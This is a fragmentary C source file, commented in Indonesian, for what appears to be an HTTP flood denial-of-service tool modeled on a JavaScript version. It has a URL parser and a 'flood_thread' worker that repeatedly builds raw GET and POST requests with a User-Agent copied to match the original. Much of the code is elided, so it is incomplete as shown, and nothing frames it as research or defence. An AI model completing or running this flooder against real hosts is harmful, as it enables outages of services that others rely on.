...
// User-Agent sama persis kayak JS
...
// Fungsi parse URL kayak JS url.parse()
void parse_url(const char* url) {
    ...
    if (protocol) {
        *protocol = '\0';
        ...
        // Kalo ga ada protocol, anggap IP langsung
...
void* flood_thread(void* arg) {
    ...
    while (running) {
        ...
        for (i = 0; i < 50; i++) {
            ...
            char req_get[1024];
            sprintf(req_get, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", 
            ...
            char req_post[512];
            sprintf(req_post, "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", 
